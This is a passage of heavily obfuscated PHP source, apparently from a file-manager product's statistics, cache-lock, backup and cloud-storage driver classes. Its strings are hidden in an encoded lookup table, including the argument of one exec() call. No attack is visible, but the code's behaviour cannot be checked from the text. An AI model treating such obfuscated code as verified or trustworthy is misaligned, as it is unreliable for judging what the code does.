Model($¬ÚœÀ»±[535])->where($‰·É¥¸Ö)->count($¬ÚœÀ»±[1667]); if (!$áÑ¯¸­) { $áÑ¯¸­ = 1; } $‰·É¥¸Ö = array($¬ÚœÀ»±[1818] => array($¬ÚœÀ»±[1019], $êˆ»¦ë‘)); $¶—î”´ = Model($¬ÚœÀ»±[535])->where($‰·É¥¸Ö)->count($¬ÚœÀ»±[1667]); return array($¬ÚœÀ»±[760] => (int) $ìçÕ“±î, $¬ÚœÀ»±[1819] => (int) ($ìçÕ“±î - $›ÏÅ¸“š), $¬ÚœÀ»±[1820] => (int) $›ÏÅ¸“š, $¬ÚœÀ»±[1821] => (int) $¶—î”´, $¬ÚœÀ»±[1822] => $áÑ¯¸­); } private function optionFile() { $¾ÚÉİ•å =& $_SERVER[ùÆÎÔ“Ñ]; $­íºğóù = $this->sourceSize(); $é¡‰ÔØù = $­íºğóù[$¾ÚÉİ•å[76]]; $§ô¡¸ç = $­íºğóù[$¾ÚÉİ•å[1791]]; $Áº¬††ù = Model($¾ÚÉİ•å[826])->where(array($¾ÚÉİ•å[410] => 0))->count($¾ÚÉİ•å[402]); $ÛÚö¼Ä’ = array($¾ÚÉİ•å[410] => 0, $¾ÚÉİ•å[200] => array($¾ÚÉİ•å[1019], strtotime(date($¾ÚÉİ•å[1798])))); $¡ºåİêŞ = Model($¾ÚÉİ•å[826])->where($ÛÚö¼Ä’)->sum($¾ÚÉİ•å[76]); $îŸŸÀ = Model($¾ÚÉİ•å[826])->where($ÛÚö¼Ä’)->count($¾ÚÉİ•å[402]); return array($¾ÚÉİ•å[764] => $é¡‰ÔØù, $¾ÚÉİ•å[1791] => $§ô¡¸ç, $¾ÚÉİ•å[1823] => $é¡‰ÔØù - $§ô¡¸ç, $¾ÚÉİ•å[1824] => (int) $¡ºåİêŞ, $¾ÚÉİ•å[766] => (int) $Áº¬††ù, $¾ÚÉİ•å[1825] => (int) $îŸŸÀ); } private function optionAccess() { $üÌñ˜â¿ =& $_SERVER[ùÆÎÔ“Ñ]; return array($üÌñ˜â¿[760] => $this->typeLogCnt(), $üÌñ˜â¿[107] => $this->typeLogCnt($üÌñ˜â¿[107]), $üÌñ˜â¿[452] => $this->typeLogCnt($üÌñ˜â¿[452]), $üÌñ˜â¿[1826] => $this->typeLogCnt($üÌñ˜â¿[1826]), $üÌñ˜â¿[1827] => $this->typeLogCnt($üÌñ˜â¿[1827]), $üÌñ˜â¿[600] => $this->typeLogCnt($üÌñ˜â¿[12], $üÌñ˜â¿[1802])); } private function typeLogCnt($ÉŸá = '', $„¦…·Õ = "\151\x64") { $‘©Í«¦ =& $_SERVER[ùÆÎÔ“Ñ]; $ı‡ã‡Ç = array($‘©Í«¦[107] => array($‘©Í«¦[1828], $‘©Í«¦[1829]), $‘©Í«¦[452] => array($‘©Í«¦[1830], $‘©Í«¦[1831]), $‘©Í«¦[1826] => array($‘©Í«¦[1832], $‘©Í«¦[1833], $‘©Í«¦[1834]), $‘©Í«¦[1827] => array($‘©Í«¦[1835], $‘©Í«¦[1836]), $‘©Í«¦[1837] => array($‘©Í«¦[1838], $‘©Í«¦[1839], $‘©Í«¦[1840])); $Çõ¡ğŸª = strtotime(date($‘©Í«¦[1798])); $ÂÛğŠ“Û = array($‘©Í«¦[200] => array($‘©Í«¦[1019], $Çõ¡ğŸª)); if ($ÉŸá) { $ÂÛğŠ“Û[$‘©Í«¦[33]] = array($‘©Í«¦[7], $ı‡ã‡Ç[$ÉŸá]); } $…éõ”¢ = Model($‘©Í«¦[1801])->where($ÂÛğŠ“Û)->count($„¦…·Õ); return (int) $…éõ”¢; } private function optionServer() { $Äëìƒåğ =& $_SERVER[ùÆÎÔ“Ñ]; $ÌÅ¨°Æ = $this->diskDriver(); $¡·õãğ = KodIO::defaultDriver(); $ó”×ô‡ = array($Äëìƒåğ[818] => $¡·õãğ[$Äëìƒåğ[399]]); $ãÆ¿‰åÕ = Model($Äëìƒåğ[471])->where($ó”×ô‡)->sum($Äëìƒåğ[76]); $¾Õ†À³ = explode($Äëìƒåğ[53], $_SERVER[$Äëìƒåğ[143]]); $áè‰Ş›Ù = $¾Õ†À³[0]; $ÂéÎøµÜ = $GLOBALS[$Äëìƒåğ[6]][$Äëìƒåğ[21]]; $éÌ«ÛŸ = $ÂéÎøµÜ[$Äëìƒåğ[981]]; if ($éÌ«ÛŸ == $Äëìƒåğ[969]) { $Ê ¾ô¿ = explode($Äëìƒåğ[1285], $ÂéÎøµÜ[$Äëìƒåğ[980]]); $éÌ«ÛŸ = $Ê ¾ô¿[0]; } if ($éÌ«ÛŸ == $Äëìƒåğ[917] || $éÌ«ÛŸ == $Äëìƒåğ[805]) { $á­´â‹Æ = Model()->db()->query($Äëìƒåğ[1841]); $„—ùË¯ = $á­´â‹Æ[0] && isset($á­´â‹Æ[0][$Äëìƒåğ[1566]]) ? $á­´â‹Æ[0][$Äëìƒåğ[1566]] : 0; $éÌ«ÛŸ = $Äëìƒåğ[1842] . ($„—ùË¯ ? $Äëìƒåğ[8] . $„—ùË¯ : $Äëìƒåğ[12]); } $ÒÆÏŠ˜ú = $GLOBALS[$Äëìƒåğ[6]][$Äëìƒåğ[349]][$Äëìƒåğ[828]]; return array($Äëìƒåğ[1843] => $ÌÅ¨°Æ ? $ÌÅ¨°Æ[$Äëìƒåğ[1844]] : 0, $Äëìƒåğ[1845] => $ÌÅ¨°Æ ? $ÌÅ¨°Æ[$Äëìƒåğ[1846]] : 0, $Äëìƒåğ[1847] => (int) $¡·õãğ[$Äëìƒåğ[1844]] * 1024 * 1024 * 1024, $Äëìƒåğ[1848] => (int) $ãÆ¿‰åÕ, $Äëìƒåğ[1849] => ucfirst($áè‰Ş›Ù), $Äëìƒåğ[1850] => $Äëìƒåğ[1851] . PHP_VERSION, $Äëìƒåğ[1852] => phpBuild64() ? 64 : 32, $Äëìƒåğ[759] => str_replace($Äëìƒåğ[1135], $Äëìƒåğ[997], $éÌ«ÛŸ), $Äëìƒåğ[349] => ucfirst($ÒÆÏŠ˜ú), $Äëìƒåğ[32] => $_SERVER[$Äëìƒåğ[1853]]); } private function diskDriver() { $Õ¸¢ĞËß =& $_SERVER[ùÆÎÔ“Ñ]; $‘µ°©ìœ = $Õ¸¢ĞËß[8]; $‚Ğºªüğ = $GLOBALS[$Õ¸¢ĞËß[6]][$Õ¸¢ĞËß[1302]] == $Õ¸¢ĞËß[1303]; if ($‚Ğºªüğ) { $‘µ°©ìœ = $Õ¸¢ĞËß[1854]; if (function_exists($Õ¸¢ĞËß[1855])) { exec($Õ¸¢ĞËß[1856], $±øƒüßÛ); $‘µ°©ìœ = $±øƒüßÛ[1] . $Õ¸¢ĞËß[8]; } } if (!file_exists($‘µ°©ìœ)) { return; } $Ğ°ª‚×Ê = @disk_total_space($‘µ°©ìœ); $´Ø‘¸÷ = $Ğ°ª‚×Ê - @disk_free_space($‘µ°©ìœ); return array($Õ¸¢ĞËß[1844] => $Ğ°ª‚×Ê, $Õ¸¢ĞËß[1846] => $´Ø‘¸÷); } public function fileChart($×»íŒ±¶) { $êòİàÃÔ =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($×»íŒ±¶[$êòİàÃÔ[1667]])) { return Model($êòİàÃÔ[826])->userFileTypeProfile($×»íŒ±¶[$êòİàÃÔ[1667]]); } if (isset($×»íŒ±¶[$êòİàÃÔ[1857]])) { return Model($êòİàÃÔ[826])->groupFileTypeProfile($×»íŒ±¶[$êòİàÃÔ[1857]]); } $À™¸Çß» = $this->sourceSize(); $£ÀÈùÔ = array($êòİàÃÔ[432] => 0, $êòİàÃÔ[411] => 1); $Š½¥Ö¬ = Model($êòİàÃÔ[826])->where($£ÀÈùÔ)->sum($êòİàÃÔ[76]); $£ÀÈùÔ[$êòİàÃÔ[411]] = 2; $çÇ Ñæñ = Model($êòİàÃÔ[826])->where($£ÀÈùÔ)->sum($êòİàÃÔ[76]); return array($êòİàÃÔ[764] => $À™¸Çß»[$êòİàÃÔ[76]], $êòİàÃÔ[1791] => $À™¸Çß»[$êòİàÃÔ[1791]], $êòİàÃÔ[1792] => (int) $Š½¥Ö¬, $êòİàÃÔ[1793] => (int) $çÇ Ñæñ); } private function sourceSize() { $ªöíóãà =& $_SERVER[ùÆÎÔ“Ñ]; $Õƒî”‘¿ = Model($ªöíóãà[826])->where(array($ªöíóãà[410] => 0))->sum($ªöíóãà[76]); $Òë«¿Çø = Model($ªöíóãà[471])->sum($ªöíóãà[76]); if ($Òë«¿Çø > $Õƒî”‘¿) { $Òë«¿Çø = $Õƒî”‘¿; } return array($ªöíóãà[76] => (int) $Õƒî”‘¿, $ªöíóãà[1791] => (int) $Òë«¿Çø); } } goto b’…Øµ¢; AêÙ°²ö’: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ûÄÈÂ–ï =& $_SERVER[ùÆÎÔ“Ñ]; $ÄÂ³Ù€ú = $GLOBALS[$ûÄÈÂ–ï[6]][$ûÄÈÂ–ï[349]]; self::$cachePath = $ÄÂ³Ù€ú[$ûÄÈÂ–ï[199]][$ûÄÈÂ–ï[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($®á¾§Ğ, $ŞØ²ÍšÕ = 0) { $´øºè€ =& $_SERVER[ùÆÎÔ“Ñ]; $¨éò•öó = microtime(!0); $®ìš—ñ£ = $¨éò•öó + $ŞØ²ÍšÕ + 0.0001; $æÌç×åœ = rtrim(self::$cachePath, $´øºè€[8]) . $´øºè€[868] . md5($®á¾§Ğ) . $´øºè€[865]; if (file_exists($æÌç×åœ) && filemtime($æÌç×åœ) && filemtime($æÌç×åœ) < time() - 10) { @unlink($æÌç×åœ); } do { if (file_exists($æÌç×åœ)) { cacheLockWait(); continue; } $ü‡òë² = fopen($æÌç×åœ, $´øºè€[869]); if (!$ü‡òë²) { return !1; } $Œ”Õãµ¿ = flock($ü‡òë², LOCK_EX | LOCK_NB); self::$caches[$®á¾§Ğ] = array($´øºè€[870] => $ü‡òë², $´øºè€[199] => $æÌç×åœ); fwrite($ü‡òë², $®ìš—ñ£); clearstatcache(); if ($ü‡òë² && $Œ”Õãµ¿) { return !0; } cacheLockWait(); } while (microtime(!0) < $®ìš—ñ£); $this->unlock($®á¾§Ğ); return !1; } public function lockGet($‹Ô¨ıóï) { $ï¢–üË =& $_SERVER[ùÆÎÔ“Ñ]; $à¸æâˆœ = rtrim(self::$cachePath, $ï¢–üË[8]) . $ï¢–üË[868] . md5($‹Ô¨ıóï) . $ï¢–üË[865]; return file_exists($à¸æâˆœ); } public function unlock($ûıÄĞÂá) { $Â‘’ıéæ =& $_SERVER[ùÆÎÔ“Ñ]; $÷¿Ÿ÷â— = self::$caches[$ûıÄĞÂá]; if (!$÷¿Ÿ÷â—) { return; } @flock($÷¿Ÿ÷â—[$Â‘’ıéæ[870]], LOCK_UN); @fclose($÷¿Ÿ÷â—[$Â‘’ıéæ[870]]); @unlink($÷¿Ÿ÷â—[$Â‘’ıéæ[199]]); unset(self::$caches[$ûıÄĞÂá]); } } class CacheLockRedis { public function lock($¹Ôä«ºÌ, $è€ŒË¼Â = 10) { $ÇÏ†§‚› = Cache::init(); $í¨•öñ = microtime(!0) + $è€ŒË¼Â; while (microtime(!0) < $í¨•öñ) { $­Å£•÷ = $ÇÏ†§‚›->get($¹Ôä«ºÌ); if (!$­Å£•÷) { $ğ“İõ“¥ = $ÇÏ†§‚›->setLock($¹Ôä«ºÌ, $í¨•öñ, $è€ŒË¼Â); if ($ğ“İõ“¥) { return !0; } } else { if ($­Å£•÷ < microtime(!0)) { $ÇÏ†§‚›->set($¹Ôä«ºÌ, $í¨•öñ, $è€ŒË¼Â * 2); if ($ÇÏ†§‚›->get($¹Ôä«ºÌ) === $­Å£•÷) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¯µ£ö‹ì) { return Cache::init()->get($¯µ£ö‹ì); } public function unlock($„Á™’…Ø) { return Cache::init()->remove($„Á™’…Ø); } } class CacheLockMemcached { public function lock($ëÉöƒ€’, $Àê›Ä°´ = 0) { $Ì©ŠÛı‰ = Cache::init(); $¤áşê”í = microtime(!0) + $Àê›Ä°´; while (microtime(!0) < $¤áşê”í) { $¿µ…Ö»” = $Ì©ŠÛı‰->get($ëÉöƒ€’); if (!$¿µ…Ö»” || $¿µ…Ö»” < microtime(!0)) { $µùâÍÜŸ = $Ì©ŠÛı‰->handle->add($ëÉöƒ€’, $¤áşê”í, $Àê›Ä°´); if ($µùâÍÜŸ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($†‰–Ô–Ì) { return Cache::init()->get($†‰–Ô–Ì); } public function unlock($€å²ÙíÕ) { return Cache::init()->remove($€å²ÙíÕ); } } goto dŒÛˆ‘Î¥¦; câ»…©¡éç: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ßÒ½¥´á =& $_SERVER[ùÆÎÔ“Ñ]; $this->isManual(); self::$name = date($ßÒ½¥´á[749]); if (!($¦Ã“’º³ = Model($ßÒ½¥´á[750])->lastItem())) { $¦Ã“’º³ = $this->initData(); } else { self::$name = $¦Ã“’º³[$ßÒ½¥´á[32]]; if ($¦Ã“’º³[$ßÒ½¥´á[751]] == $ßÒ½¥´á[88]) { self::$name = date($ßÒ½¥´á[752]); $Œğ²³ä = 0; if (isset($¦Ã“’º³[$ßÒ½¥´á[293]][$ßÒ½¥´á[199]][$ßÒ½¥´á[468]])) { $Œğ²³ä = (int) $¦Ã“’º³[$ßÒ½¥´á[293]][$ßÒ½¥´á[199]][$ßÒ½¥´á[468]]; } if (self::$manual == 0 && $¦Ã“’º³[$ßÒ½¥´á[32]] == self::$name) { Model($ßÒ½¥´á[750])->remove($¦Ã“’º³[$ßÒ½¥´á[399]]); } $¦Ã“’º³ = $this->initData($Œğ²³ä, $¦Ã“’º³[$ßÒ½¥´á[753]]); } else { $this->checkStore($¦Ã“’º³[$ßÒ½¥´á[753]]); } } self::$option = $¦Ã“’º³; } private function isManual() { $‡ƒîŒ•è = _get($GLOBALS, $_SERVER[ùÆÎÔ“Ñ][754], 0); $‡ƒîŒ•è = intval($‡ƒîŒ•è); self::$manual = $‡ƒîŒ•è && $‡ƒîŒ•è == 1 ? 1 : 0; } private function initData($‹¥Ä· = 0, $£‹İˆ†¥ = '') { $‰Á˜µôÙ =& $_SERVER[ùÆÎÔ“Ñ]; $»ª„€ = Model($‰Á˜µôÙ[750])->config(); if ($£‹İˆ†¥ && $»ª„€[$‰Á˜µôÙ[753]] != $£‹İˆ†¥) { $‹¥Ä· = 0; } $this->checkStore($»ª„€[$‰Á˜µôÙ[753]]); if (self::$manual == 1) { self::$name .= $‰Á˜µôÙ[11] . date($‰Á˜µôÙ[755]); } $¤ØÊûÈ = array($‰Á˜µôÙ[753] => $»ª„€[$‰Á˜µôÙ[753]], $‰Á˜µôÙ[32] => self::$name, $‰Á˜µôÙ[751] => 0, $‰Á˜µôÙ[756] => $»ª„€[$‰Á˜µôÙ[756]], $‰Á˜µôÙ[757] => self::$manual, $‰Á˜µôÙ[293] => array($‰Á˜µôÙ[758] => array($‰Á˜µôÙ[751] => 0), $‰Á˜µôÙ[759] => array($‰Á˜µôÙ[751] => 0, $‰Á˜µôÙ[760] => 0, $‰Á˜µôÙ[761] => 0, $‰Á˜µôÙ[33] => $‰Á˜µôÙ[12], $‰Á˜µôÙ[762] => 0, $‰Á˜µôÙ[497] => 0), $‰Á˜µôÙ[763] => array($‰Á˜µôÙ[751] => 0, $‰Á˜µôÙ[760] => 0, $‰Á˜µôÙ[761] => 0, $‰Á˜µôÙ[762] => 0, $‰Á˜µôÙ[497] => 0), $‰Á˜µôÙ[199] => array($‰Á˜µôÙ[751] => 0, $‰Á˜µôÙ[764] => 0, $‰Á˜µôÙ[765] => 0, $‰Á˜µôÙ[766] => 0, $‰Á˜µôÙ[767] => 0, $‰Á˜µôÙ[468] => $‹¥Ä·, $‰Á˜µôÙ[762] => 0, $‰Á˜µôÙ[497] => 0)), $‰Á˜µôÙ[762] => time(), $‰Á˜µôÙ[497] => 0); $ºó˜¤ò• = Model($‰Á˜µôÙ[750])->insert($¤ØÊûÈ); $¤ØÊûÈ[$‰Á˜µôÙ[399]] = $ºó˜¤ò•; return $¤ØÊûÈ; } private function checkStore($ ÂÖêè¬) { $˜£Î¥ =& $_SERVER[ùÆÎÔ“Ñ]; $ŸÛ²“ = Model($˜£Î¥[768])->listData($ ÂÖêè¬); Model($˜£Î¥[768])->checkConfig($ŸÛ²“); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ùÆÎÔ“Ñ][750])->findByName(self::$name); } return self::$option; } public static function set($•ô° çÈ) { $Ñ¯Š¨ğÁ =& $_SERVER[ùÆÎÔ“Ñ]; $™µ²îï‰ = self::get(); foreach ($•ô° çÈ as $ÍªğÍ¬ˆ => $äÈÃñÖ) { $ÑÊ•øªŒ = explode($Ñ¯Š¨ğÁ[10], $ÍªğÍ¬ˆ); $ÄÚÕË¥ = count($ÑÊ•øªŒ); switch ($ÄÚÕË¥) { case 1: $™µ²îï‰[$ÑÊ•øªŒ[0]] = $äÈÃñÖ; break; case 2: $™µ²îï‰[$ÑÊ•øªŒ[0]][$ÑÊ•øªŒ[1]] = $äÈÃñÖ; break; case 3: $™µ²îï‰[$ÑÊ•øªŒ[0]][$ÑÊ•øªŒ[1]][$ÑÊ•øªŒ[2]] = $äÈÃñÖ; break; } } Model($Ñ¯Š¨ğÁ[750])->update($™µ²îï‰[$Ñ¯Š¨ğÁ[399]], $™µ²îï‰); self::$option = $™µ²îï‰; return self::$option; } public function keep() { $·¿âïû =& $_SERVER[ùÆÎÔ“Ñ]; $’®ü´ÎÁ = self::get(); if ($’®ü´ÎÁ[$·¿âïû[293]][$·¿âïû[758]][$·¿âïû[751]] == $·¿âïû[88]) { return; } $this->backupKeep($’®ü´ÎÁ); self::set(array($·¿âïû[769] => 1)); } private function backupKeep($Ê·éëâï) { $®¥§ş’È =& $_SERVER[ùÆÎÔ“Ñ]; if (self::$manual == 1) { return; } $±üŞÑĞï = Model($®¥§ş’È[750])->listData(); if (empty($±üŞÑĞï)) { return; } $Å­¶öÜï = 0; $®“È˜ = array(); foreach ($±üŞÑĞï as $œÍÇ‘• ) { if ($Å­¶öÜï >= 7) { break; } $®“È˜[] = $œÍÇ‘• [$®¥§ş’È[32]]; $Å­¶öÜï++; } for ($Å­¶öÜï = 0; $Å­¶öÜï < 12; $Å­¶öÜï++) { $®“È˜[] = date($®¥§ş’È[770], strtotime("\x2d{$Å­¶öÜï}\40\155\x6f\156\x74\x68\163")); } $®“È˜ = array_unique($®“È˜); $Í‘˜ö€Ø = Model($®¥§ş’È[771])->get($®¥§ş’È[772]); foreach ($±üŞÑĞï as $œÍÇ‘• ) { if (isset($œÍÇ‘• [$®¥§ş’È[757]]) && $œÍÇ‘• [$®¥§ş’È[757]] == $®¥§ş’È[88]) { continue; } if (!empty($œÍÇ‘• [$®¥§ş’È[32]]) && in_array($œÍÇ‘• [$®¥§ş’È[32]], $®“È˜)) { continue; } Model($®¥§ş’È[750])->remove($œÍÇ‘• [$®¥§ş’È[399]]); $ì¼È‘´ = $this->backupPath($Ê·éëâï, $Í‘˜ö€Ø); IO::remove($ì¼È‘´, !1); } } private function backupPath($ğ•Áç±, $æÏô»¢Ù = false) { $¬ìë«…Ù =& $_SERVER[ùÆÎÔ“Ñ]; if (!$æÏô»¢Ù) { $æÏô»¢Ù = Model($¬ìë«…Ù[771])->get($¬ìë«…Ù[772]); } $ôúööä = $ğ•Áç±[$¬ìë«…Ù[32]]; $ßÆŒñÕ™ = substr(md5($¬ìë«…Ù[773] . $æÏô»¢Ù . $ôúööä), 0, 8); return "\173\151\157\72{$ğ•Áç±[$¬ìë«…Ù[753]]}\x7d\57\144\x61\x74\x61\142\x61\163\x65\x2f\x62\x61\x63\153\x75\160\57" . $ôúööä . $¬ìë«…Ù[11] . $ßÆŒñÕ™; } public function db() { $ÒÁ¢õìø =& $_SERVER[ùÆÎÔ“Ñ]; $‘²şà·” = self::get(); if ($‘²şà·”[$ÒÁ¢õìø[293]][$ÒÁ¢õìø[759]][$ÒÁ¢õìø[751]] == $ÒÁ¢õìø[88]) { return !0; } $Ü¬—•Àô = new BackupDb(); if (!$Ü¬—•Àô->index()) { return !1; } self::set(array($ÒÁ¢õìø[774] => 1)); return !0; } public function dbFile() { $™¡”ÛÒî =& $_SERVER[ùÆÎÔ“Ñ]; $°Äµº–° = self::get(); if ($°Äµº–°[$™¡”ÛÒî[293]][$™¡”ÛÒî[763]][$™¡”ÛÒî[751]] == $™¡”ÛÒî[88]) { return !0; } $ä‘ú±è¿ = new BackupDbFile(); if (!$ä‘ú±è¿->index()) { return !1; } self::set(array($™¡”ÛÒî[775] => 1)); return !0; } public function file() { $§åêâœ» =& $_SERVER[ùÆÎÔ“Ñ]; $±†á¿Ëá = self::get(); if ($±†á¿Ëá[$§åêâœ»[293]][$§åêâœ»[199]][$§åêâœ»[751]] == $§åêâœ»[88]) { return !0; } if (!isset($±†á¿Ëá[$§åêâœ»[756]]) || $±†á¿Ëá[$§åêâœ»[756]] == $§åêâœ»[197]) { $î¦ß˜æÍ = new BackupFile(); if (!$î¦ß˜æÍ->index()) { return !1; } } self::set(array($§åêâœ»[776] => 1, $§åêâœ»[751] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $«¹Âåğ =& $_SERVER[ùÆÎÔ“Ñ]; $Ë‰öåŒù = Backup::get(); self::$io = $Ë‰öåŒù[$«¹Âåğ[753]]; self::$name = $Ë‰öåŒù[$«¹Âåğ[32]]; $ü®¸—¼ğ = new DbManage(); $¦¡Šë»é = $ü®¸—¼ğ->dbType(); $²û¯ùûœ = array($«¹Âåğ[777] => $¦¡Šë»é, $«¹Âåğ[778] => time()); Backup::set($²û¯ùûœ); $éü‚¼…ı = $this->tmpFilesPath() . $«¹Âåğ[779] . self::$name . $«¹Âåğ[8]; del_dir($éü‚¼…ı); mk_dir($éü‚¼…ı); $ÀÏÚğƒ¥ = $ Ü³Ô·Ï = 0; $ãÙÊïˆÌ = new Task($«¹Âåğ[780], $«¹Âåğ[781], 0, LNG($«¹Âåğ[782]) . $«¹Âåğ[783] . LNG($«¹Âåğ[784])); try { $³š—Ú¾÷ = $ü®¸—¼ğ->db()->getTables(); } catch (Exception $ò‚Æãƒ) { $ãÙÊïˆÌ->end(); return !1; } $³š—Ú¾÷ = array_diff($³š—Ú¾÷, array($«¹Âåğ[785], $«¹Âåğ[786])); foreach ($³š—Ú¾÷ as $ª½ŞõÇ) { $ÀÏÚğƒ¥ += $ü®¸—¼ğ->model($ª½ŞõÇ)->count(); } $ãÙÊïˆÌ->task[$«¹Âåğ[787]] = $ÀÏÚğƒ¥; $GLOBALS[$«¹Âåğ[788]] = self::$name; foreach ($³š—Ú¾÷ as $ª½ŞõÇ) { $İíŠ—­’ = $éü‚¼…ı . $ª½ŞõÇ . $«¹Âåğ[789]; $÷¾ÕÕ¤É = null; if ($ª½ŞõÇ == $«¹Âåğ[790] && (!isset($Ë‰öåŒù[$«¹Âåğ[756]]) || $Ë‰öåŒù[$«¹Âåğ[756]] == $«¹Âåğ[197])) { $÷¾ÕÕ¤É = self::$io; } $ Ü³Ô·Ï += $ü®¸—¼ğ->sqlFromDb($ª½ŞõÇ, $İíŠ—­’, $ãÙÊïˆÌ, $÷¾ÕÕ¤É); } unset($GLOBALS[$«¹Âåğ[788]]); $ãÙÊïˆÌ->end(); if ($ Ü³Ô·Ï > $ÀÏÚğƒ¥) { $ÀÏÚğƒ¥ = $ Ü³Ô·Ï; } $²û¯ùûœ = array($«¹Âåğ[777] => $¦¡Šë»é, $«¹Âåğ[774] => 1, $«¹Âåğ[791] => $ÀÏÚğƒ¥, $«¹Âåğ[792] => $ Ü³Ô·Ï, $«¹Âåğ[793] => time()); Backup::set($²û¯ùûœ); if ($ÀÏÚğƒ¥ - $ Ü³Ô·Ï > 0) { $ş¡êÚ÷¹ = $«¹Âåğ[794]; if (stristr(I18n::getType(), $«¹Âåğ[795])) { $ş¡êÚ÷¹ = $«¹Âåğ[796]; } write_log(array($ş¡êÚ÷¹, $²û¯ùûœ), $«¹Âåğ[781]); return !1; } return !0; } private function tmpFilesPath() { $—¿Ï¤œè =& $_SERVER[ùÆÎÔ“Ñ]; $ášÑÅ´ = TEMP_FILES; if ($GLOBALS[$—¿Ï¤œè[6]][$—¿Ï¤œè[89]][$—¿Ï¤œè[797]]) { $ášÑÅ´ = $GLOBALS[$—¿Ï¤œè[6]][$—¿Ï¤œè[89]][$—¿Ï¤œè[797]]; if (!mk_dir($ášÑÅ´) || !is_writable($ášÑÅ´) || !IO::mkfile($ášÑÅ´ . $—¿Ï¤œè[798])) { $ášÑÅ´ = TEMP_FILES; } } return $ášÑÅ´; } } class BackupDbFile { public function __construct() { } public function index() { $”»ğ€şÎ =& $_SERVER[ùÆÎÔ“Ñ]; $ìÔõëÒÖ = Backup::get(); $£¾Ï§å = $ìÔõëÒÖ[$”»ğ€şÎ[32]]; $øÍ”†³˜ = $this->tmpFilesPath() . "\142\141\x63\153\x75\160\137{$£¾Ï§å}\x2f"; $¿ğ±Ô¾ = $this->backupPath($ìÔõëÒÖ); if (!($¿ğ±Ô¾ = IO::mkdir($¿ğ±Ô¾))) { return !1; } $ÈéÓ“¬È = IO::listPath($øÍ”†³˜); $­†•à¿¸ = isset($ÈéÓ“¬È[$”»ğ€şÎ[83]]) ? $ÈéÓ“¬È[$”»ğ€şÎ[83]] : array(); $éí©½¯ = array_sum(array_column($­†•à¿¸, $”»ğ€şÎ[76])); if (!$éí©½¯) { return !1; } $ŒóÀó¼ø = array($”»ğ€şÎ[799] => $éí©½¯, $”»ğ€şÎ[800] => time()); Backup::set($ŒóÀó¼ø); $¦¼„‰“Š = new TaskFileTransfer($”»ğ€şÎ[801], $”»ğ€şÎ[781], count($­†•à¿¸), LNG($”»ğ€şÎ[782]) . $”»ğ€şÎ[386] . LNG($”»ğ€şÎ[784]) . $”»ğ€şÎ[802]); $¦¼„‰“Š->task[$”»ğ€şÎ[764]] = $éí©½¯; foreach ($ÈéÓ“¬È[$”»ğ€şÎ[83]] as $äøñ¢ºÖ) { $®ôÆáŒ— = IO::move($äøñ¢ºÖ[$”»ğ€şÎ[84]], $¿ğ±Ô¾); if (!$®ôÆáŒ—) { $¦¼„‰“Š->end(); $Áš‰ÅÅì = IO::getLastError($”»ğ€şÎ[803] . $äøñ¢ºÖ[$”»ğ€şÎ[84]] . $”»ğ€şÎ[804] . $¿ğ±Ô¾ . $”»ğ€şÎ[164]); write_log($Áš‰ÅÅì, $”»ğ€şÎ[781]); return !1; } } $Áƒ—Ù¤³ = new DbManage(); $…üÖÁÍñ = $Áƒ—Ù¤³->getSqlFile(); if (!$…üÖÁÍñ[$”»ğ€şÎ[805]] || !$…üÖÁÍñ[$”»ğ€şÎ[13]]) { return !1; } IO::move($…üÖÁÍñ[$”»ğ€şÎ[805]], $¿ğ±Ô¾); IO::move($…üÖÁÍñ[$”»ğ€şÎ[13]], $¿ğ±Ô¾); $¦¼„‰“Š->end(); $ŒóÀó¼ø = array($”»ğ€şÎ[806] => $éí©½¯, $”»ğ€şÎ[807] => time()); Backup::set($ŒóÀó¼ø); return !0; } private function backupPath($Ş†‡°ÉÂ) { $“Ö¬‹§Ì =& $_SERVER[ùÆÎÔ“Ñ]; $Ô‚»§ƒÙ = $Ş†‡°ÉÂ[$“Ö¬‹§Ì[32]]; $æÑæ€©± = Model($“Ö¬‹§Ì[771])->get($“Ö¬‹§Ì[772]); $î¸‹µ¤Š = substr(md5($“Ö¬‹§Ì[773] . $æÑæ€©± . $Ô‚»§ƒÙ), 0, 8); return "\173\x69\157\72{$Ş†‡°ÉÂ[$“Ö¬‹§Ì[753]]}\175\x2f\x64\141\164\x61\x62\x61\x73\x65\x2f\x62\x61\x63\153\165\x70\x2f" . $Ô‚»§ƒÙ . $“Ö¬‹§Ì[11] . $î¸‹µ¤Š; } private function tmpFilesPath() { $ÜªÑ¼°à =& $_SERVER[ùÆÎÔ“Ñ]; $Œğ†®Ìº = TEMP_FILES; if ($GLOBALS[$ÜªÑ¼°à[6]][$ÜªÑ¼°à[89]][$ÜªÑ¼°à[797]]) { $Œğ†®Ìº = $GLOBALS[$ÜªÑ¼°à[6]][$ÜªÑ¼°à[89]][$ÜªÑ¼°à[797]]; if (!mk_dir($Œğ†®Ìº) || !is_writable($Œğ†®Ìº) || !IO::mkfile($Œğ†®Ìº . $ÜªÑ¼°à[798])) { $Œğ†®Ìº = TEMP_FILES; } } return $Œğ†®Ìº; } } goto fÄ‰†´´™„; E“Ã¼á¦Ë: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¾­™î¥Ã) { parent::__construct($¾­™î¥Ã); $this->signatureVersion($_SERVER[ùÆÎÔ“Ñ][216]); } public function uploadFormData($³“¯øõ™, $ô»›®‡€ = 3600) { $Õñáı«ï =& $_SERVER[ùÆÎÔ“Ñ]; $¬—ğĞ¶Æ = $Õñáı«ï[198]; $ êÂ„‘™ = $Õñáı«ï[232]; $²°óâˆæ = $Õñáı«ï[1324]; $Ç‘‰Êİİ = gmdate($Õñáı«ï[1325], time() + $ô»›®‡€); $ÂË»™Õ£ = (string) time() . $Õñáı«ï[71] . (string) (time() + $ô»›®‡€); $îµ€¨«­ = array($Õñáı«ï[1326] => $Ç‘‰Êİİ, $Õñáı«ï[1327] => array(array($Õñáı«ï[1328] => $¬—ğĞ¶Æ), array($Õñáı«ï[1329] => $this->bucket), array($Õñáı«ï[1330], $Õñáı«ï[1331], $Õñáı«ï[12]), array($Õñáı«ï[1332] => $²°óâˆæ), 